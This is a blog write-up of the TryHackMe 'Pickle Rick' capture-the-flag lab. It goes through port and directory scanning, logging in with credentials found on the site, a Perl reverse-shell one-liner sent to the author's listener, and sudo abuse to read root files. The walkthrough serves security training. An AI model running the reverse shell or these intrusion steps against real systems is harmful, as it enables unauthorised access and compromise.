---
tagline: picklerick
title: Pickle Rick | Writeup
description: An extra-fun web server exploitation room
banner: /blog/picklerickbanner.jpeg/
banner_alt: Information is power. But like all power, there are those who want to keep it for themselves. -Aaron Swartz
date: '2024-03-10'
---

## 📡 NMAP Scan

```bash:Terminal
┌──(vipin㉿vipin)-[~]
└─$ sudo nmap -sS -sV 10.10.108.226
[sudo] password for vipin: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-09 21:47 EST
Nmap scan report for 10.10.108.226
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.31 seconds
```

- Port 22 & 80 are open.

## 🌐 Accessing the website

- Since port 80 is open, we know there is a website. Let's check it out!

![Image showing the website](/blog/picklerick/website.png 'Fig.1')

- Judging by the blatent hint, we need to use Burpsuite.

## 🟧🔎 Burpsuite & Dirsearch

![Image showing a comment](/blog/picklerick/secretcomment.png 'Fig.2')

- In the source code, I found a comment with a username. That may be useful in the future.

- Since we have no leads to follow, lets run Dirsearch.

```bash:Terminal
┌──(vipin㉿vipin)-[~]
└─$ dirsearch -u http://10.10.108.226 --exclude-status 403,404
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                      
 (_||| _) (/_(_|| (_| )                                                                               
                                                                                                      
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/vipin/reports/http_10.10.108.226/_24-03-09_23-40-12.txt

Target: http://10.10.108.226/

[23:40:12] Starting:                                                                                  
[23:40:36] 200 -  588B  - /assets/                                          
[23:40:36] 301 -  315B  - /assets  ->  http://10.10.108.226/assets/
[23:40:53] 200 -  455B  - /login.php                                        
[23:41:03] 200 -   17B  - /robots.txt                                       
                                                                             
Task Completed
```

## Aquiring the Ingredients

- Lets look at */robots.txt* first.

![Image showing robots.txt](/blog/picklerick/robotstxt.png 'Fig.3')

- Oh! Lets just keep that text for future reference though.

- We should also take a look at */login.php* as that is the only page that would help us find stuff.

![Image showing login page](/blog/picklerick/login.png 'Fig.4')

- We know the username is *R1ckRul3s*, what if we try the text we found in */robots.txt*?

![Image showing us logged in](/blog/picklerick/loggedin.png 'Fig.5')

- AND IT WORKED!!!! It seems like we get a Command Panel, lets run some commands to get some ingredients.

- Running ```ls``` gives us this (seen in Fig.6 below)

![Image showing me running ls](/blog/picklerick/ls.png 'Fig.6')

- Now we know we can run commands like this, let's get the first ingredient first!

![Image showing it not letting me](/blog/picklerick/commandissue.png 'Fig.7')

- Welp, we might have to first spawn a reverse shell (I will be using [revshells.com](https://www.revshells.com/))

```bash:Command Panel
# below is the reverse shell i used

perl -e 'use Socket;$i="10.6.22.229";$p=6969;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

```bash:Terminal
──(vipin㉿vipin)-[~]
└─$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.6.22.229] from (UNKNOWN) [10.10.108.226] 35408
sh: 0: can't access tty; job control turned off
$ cat Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```

- Now to get the second ingredient

```bash:Terminal
$ pwd
/home/rick
$ cat second\ ingredients
1 jerry tear
$ 
```

- Running ```sudo -l``` told me I could run anything as long as I use sudo. Lets get the Final Ingredient

```bash:Terminal
$ sudo ls root
3rd.txt
snap
$ sudo cat /root/3rd.txt
3rd ingredients: fleeb juice
$ 
```

### MACHINE PWN'ED 😎

![My Tryhackme badge](https://tryhackme-badges.s3.amazonaws.com/vipin.b.png)
